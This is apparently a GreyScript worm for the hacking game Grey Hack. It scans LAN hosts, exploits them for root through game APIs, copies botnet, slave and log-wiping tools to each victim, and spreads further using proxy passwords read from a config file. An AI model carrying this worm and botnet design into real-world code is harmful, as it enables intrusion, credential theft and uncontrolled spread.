// worm.gs – final corrected version with depth tracking and correct SCP
import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/accessLevel.gs")
import_code("/scripts/utils/parse_exploit_requirements.gs")
import_code("/scripts/utils/sanitize_ip.gs")
import_code("/scripts/utils/find_lib.gs")

// Depth enforcement constants
DEPTH_MARKER_DIR = "/root/.botnet/depth_markers"
GLOBAL_DEPTH_FILE = "/root/.botnet/global_depth.enc"
HARD_DEPTH_CAP = 5  // Cannot be exceeded under any circumstances

if params.len < 4 then
    // Standalone launch: use defaults
    if params.len >= 1 then
        MASTER_PUB_FILE = params[0]
    else
        MASTER_PUB_FILE = "/root/.botnet/master.pub"
    end if
    if params.len >= 2 then
        MAX_DEPTH = params[1].to_int
    else
        MAX_DEPTH = 3
    end if
    if params.len >= 3 then
        SOURCE_IP = params[2]
    else
        SOURCE_IP = null
    end if
    if params.len >= 4 then
        CURRENT_DEPTH = params[3].to_int
    else
        CURRENT_DEPTH = 0
    end if
else
    MASTER_PUB_FILE = params[0]
    MAX_DEPTH = params[1].to_int
    SOURCE_IP = params[2]
    CURRENT_DEPTH = params[3].to_int
end if

master_pub = read_file(MASTER_PUB_FILE)
if not master_pub then exit("Master public key not found")

INFECTED_FILE = "/root/.botnet/infected.txt"
SPREAD_DELAY = 30
infected_data = read_file(INFECTED_FILE)
if infected_data then
    infected = infected_data.split(char(10))
else
    infected = []
end if
my_ip = get_shell.host_computer.public_ip
my_ip_safe = sanitize_ip(my_ip)

if infected.indexOf(my_ip) == null then
    infected.push(my_ip)
    write_file(INFECTED_FILE, infected.join(char(10)))
end if

log_master("Worm started on " + my_ip_safe + " at depth " + CURRENT_DEPTH + "/" + MAX_DEPTH, "INFO")

// Atomic write helper for depth markers
atomic_write = function(path, content)
    comp = get_shell.host_computer
    
    // Write to temp file first
    tmp_path = path + ".tmp." + str(get_shell.pid)
    parts = tmp_path.split("/")
    tmp_name = parts.pop
    tmp_dir = parts.join("/")
    if tmp_dir == "" then tmp_dir = "/"
    
    comp.touch(tmp_dir, tmp_name)
    tmp_file = comp.File(tmp_path)
    if tmp_file == null then return false
    
    tmp_file.set_content(content)
    
    // Atomic rename (move replaces destination)
    result = tmp_file.move(path)
    return result
end function

// Depth verification functions
verify_depth_chain = function(parent_ip, claimed_depth)
    comp = get_shell.host_computer
    comp.create_folder("/root/.botnet", "depth_markers")
    
    // Check if depth markers directory itself was tampered with
    // by comparing against an encrypted immutable marker
    immutable_path = "/root/.botnet/depth_immutable.enc"
    immutable_content = safe_file_read(immutable_path)
    
    if immutable_content != null then
        priv = safe_file_read("/root/.botnet/slave.priv")
        if priv != null then
            decrypted = Kyber.decrypt_message(priv, immutable_content)
            if decrypted != null then
                parts = decrypted.split("|")
                if parts.len >= 2 then
                    immutable_depth = parts[1].to_int
                    if typeof(immutable_depth) == "number" and immutable_depth > claimed_depth then
                        log_master("Depth tampering detected! Restoring from immutable marker", "ERROR")
                        // Restore the marker
                        write_file(DEPTH_MARKER_DIR + "/" + parent_ip.replace(".", "_"), str(immutable_depth))
                        return immutable_depth
                    end if
                end if
            end if
        end if
    end if
    
    // Check local marker from parent (prevents re-launch with lower depth)
    marker_file = comp.File(DEPTH_MARKER_DIR + "/" + parent_ip.replace(".", "_"))
    if marker_file != null then
        stored = marker_file.get_content
        if stored != null then
            stored_num = stored.to_int
            if typeof(stored_num) == "number" then
                // We were already infected at this depth - cannot downgrade
                return stored_num
            end if
        end if
    end if
    
    // Check encrypted global depth marker
    global_enc = read_file(GLOBAL_DEPTH_FILE)
    if global_enc != null then
        priv = read_file("/root/.botnet/slave.priv")
        if priv != null then
            dec = Kyber.decrypt_message(priv, global_enc)
            if dec != null then
                parts = dec.split("|")
                if parts.len >= 2 then
                    stored_global = parts[1].to_int
                    if typeof(stored_global) == "number" and stored_global > claimed_depth then
                        // Previous run had higher depth - enforce it
                        return stored_global
                    end if
                end if
            end if
        end if
    end if
    
    // Hard cap enforcement
    if claimed_depth >= HARD_DEPTH_CAP then
        return HARD_DEPTH_CAP
    end if
    
    return claimed_depth
end function

store_depth_marker = function(my_ip, my_depth)
    comp = get_shell.host_computer
    comp.create_folder("/root/.botnet", "depth_markers")
    
    // Local marker - atomic write
    marker_path = DEPTH_MARKER_DIR + "/" + my_ip.replace(".", "_")
    atomic_write(marker_path, str(my_depth))
    
    // Encrypted global marker - atomic write
    pub = read_file("/root/.botnet/slave.pub")
    if pub != null then
        record = my_ip + "|" + str(my_depth) + "|" + str(time)
        enc = Kyber.encrypt_message(pub, record)
        if enc != null then
            atomic_write(GLOBAL_DEPTH_FILE, enc)
            set_permissions(GLOBAL_DEPTH_FILE, "600")
        end if
    end if
    
    // Store immutable encrypted backup
    immutable_path = "/root/.botnet/depth_immutable.enc"
    if pub != null then
        immutable_record = my_ip + "|" + str(my_depth) + "|immutable"
        immutable_enc = Kyber.encrypt_message(pub, immutable_record)
        if immutable_enc != null then
            safe_file_write(immutable_path, immutable_enc)
            set_permissions(immutable_path, "400")  // Read-only
        end if
    end if
end function

scan_lan = function()
    router = get_router(null)
    if router == null then return []
    targets = []
    // FIXED: correct property name
    for ip in router.computers_lan_ip
        if ip == my_ip then continue
        if infected.indexOf(ip) != null then continue
        if SOURCE_IP != null and ip == SOURCE_IP then continue
        // RFC 1918 LAN guard - only scan private IPs
        if not (ip.indexOf("192.168.") == 0 or ip.indexOf("10.") == 0) then continue
        targets.push(ip)
    end for
    return targets
end function

exploit_target = function(ip)
    metax = get_metaxploit()
    if not metax then return null
    for port in [22, 80, 443, 8080, 1542]
        for attempt in range(0, 2)
            session = metax.net_use(ip, port)
            if session == null then continue
            lib = session.dump_lib
            if lib == null then continue
            addrs = metax.scan(lib)
            if typeof(addrs) != "list" then continue
            for addr in addrs
                raw = metax.scan_address(lib, addr)
                if typeof(raw) != "string" then continue
                // parse_exploit_requirements returns a map; handle correctly
                reqs = parse_exploit_requirements(raw)
                if typeof(reqs) == "map" and reqs.hasIndex("activeRoot") then
                    vuln_value = reqs["activeRoot"]
                    if vuln_value != null then
                        shell = lib.overflow(addr, vuln_value, "")
                        if shell != null then
                            level = accessLevel(shell)
                            if level == "root" then return shell
                        end if
                    end if
                end if
            end for
            backoff_sleep(attempt, 1, 5)
        end for
    end for
    return null
end function

deploy_to_target = function(shell, target_ip, current_depth)
    target_ip_safe = sanitize_ip(target_ip)
    log_master("Deploying to " + target_ip_safe, "INFO")
    
    // Create local temp directory with unique name including PID
    local_tmp_name = "deploy_" + str(time) + "_" + str(get_shell.pid)
    local_tmp = "/tmp/" + local_tmp_name
    
    result = get_shell.host_computer.create_folder("/tmp", local_tmp_name)
    if typeof(result) == "string" then
        log_master("Failed to create temp directory: " + result, "ERROR")
        return
    end if
    
    // Verify directory was created
    tmp_dir_obj = get_shell.host_computer.File(local_tmp)
    if tmp_dir_obj == null then
        log_master("Temp directory not found after creation", "ERROR")
        return
    end if
    
    // Copy files to local temp
    files_to_copy = ["/bin/slave.gs", "/bin/worm.gs", "/lib/kyber_lib.gs",
                     "/lib/lib_common.gs", MASTER_PUB_FILE]
    for src_path in files_to_copy
        src_file = get_shell.host_computer.File(src_path)
        if src_file then
            src_file.copy(local_tmp, src_path.split("/")[-1])
        end if
    end for
    
    // Copy all utils including file_search.gs
    utils = ["/scripts/utils/accessLevel.gs", "/scripts/utils/wipe_logs.gs",
             "/scripts/utils/sanitize_ip.gs", "/scripts/utils/parse_exploit_requirements.gs",
             "/scripts/utils/file_search.gs"]   // file_search added
    for util in utils
        src_file = get_shell.host_computer.File(util)
        if src_file then
            src_file.copy(local_tmp, util.split("/")[-1])   // FIXED: use util, not src_path
        end if
    end for
    
    // SCP each file from local temp to target using correct method
    tmp_files = tmp_dir_obj.get_files
    if tmp_files != null then
        for f in tmp_files
            get_shell.scp(local_tmp + "/" + f.name, "/tmp/", shell)
        end for
    end if
    
    // Move files to final destinations
    shell.run("mv /tmp/slave.gs /bin/slave.gs")
    shell.run("mv /tmp/worm.gs /bin/worm.gs")
    shell.run("mv /tmp/kyber_lib.gs /lib/kyber_lib.gs")
    shell.run("mv /tmp/lib_common.gs /lib/lib_common.gs")
    shell.run("mkdir -p /scripts/utils")
    for util in utils
        filename = util.split("/")[-1]
        shell.run("mv /tmp/" + filename + " /scripts/utils/" + filename)
    end for
    shell.run("mkdir -p /root/.botnet")
    shell.run("mv /tmp/master.pub /root/.botnet/master.pub")
    
    shell.launch("/bin/slave.gs")
    
    // FIXED: use current_depth + 1, and pass it as 4th parameter
    new_depth = current_depth + 1
    if new_depth < MAX_DEPTH then
        shell.launch("/bin/worm.gs", [MASTER_PUB_FILE, str(MAX_DEPTH), target_ip, str(new_depth)])
    end if
    
    infected.push(target_ip)
    write_file(INFECTED_FILE, infected.join(char(10)))
    log_master("Deployed to " + target_ip_safe, "SUCCESS")
    
    // Cleanup local temp
    tmp_dir_obj.delete
end function

// Propagate through a chain of proxies
// Inspired by 5hell's kraken
propagate_to_proxies = function(shell, current_depth)
    proxy_file = shell.host_computer.File("/root/Config/Map.conf")
    if proxy_file == null then return
    
    map_content = proxy_file.get_content
    if map_content == null then return
    
    // Parse Map.conf for proxy chains
    lines = map_content.split(char(10))
    for line in lines
        if line == "" then continue
        parts = line.split(",")
        if parts.len >= 2 then
            proxy_ip = parts[0].trim
            proxy_pass = parts[1].trim
            
            // Try to connect and propagate
            proxy_shell = get_shell.connect_service(proxy_ip, 22, "root", proxy_pass)
            if proxy_shell != null then
                deploy_to_target(proxy_shell, proxy_ip, current_depth)
            end if
        end if
    end for
end function

main = function()
    // Verify and potentially correct our depth
    actual_depth = CURRENT_DEPTH
    if SOURCE_IP != null then
        actual_depth = verify_depth_chain(SOURCE_IP, CURRENT_DEPTH)
    end if
    
    // Enforce hard cap
    if actual_depth >= HARD_DEPTH_CAP then
        log_master("Hard depth cap reached (" + str(actual_depth) + "), entering dormant mode", "WARN")
        while true
            wait(300)
        end while
    end if
    
    if actual_depth >= MAX_DEPTH then
        log_master("Max depth reached (" + str(actual_depth) + "/" + str(MAX_DEPTH) + "), idle mode", "INFO")
        while true
            wait(60)
        end while
    end if
    
    // Store our verified depth
    store_depth_marker(my_ip, actual_depth)
    
    consecutive_failures = 0
    while true
        if scan_lan().len == 0 then
            consecutive_failures = consecutive_failures + 1
            if consecutive_failures > 5 then
                log_master("No targets found, sleeping 5 minutes", "WARN")
                wait(300)
                consecutive_failures = 0
            end if
        else
            consecutive_failures = 0
        end if
        
        for target in scan_lan()
            target_safe = sanitize_ip(target)
            log_master("Attempting " + target_safe, "INFO")
            shell = exploit_target(target)
            if shell then
                log_master("Exploited " + target_safe, "SUCCESS")
                deploy_to_target(shell, target, actual_depth)   // Pass verified depth
                propagate_to_proxies(shell, actual_depth)        // Pass verified depth to proxy propagation
                backoff_sleep(0, 2, 60)
            else
                log_master("Failed " + target_safe, "WARN")
            end if
        end for
        wait(SPREAD_DELAY)
    end while
end function

main()
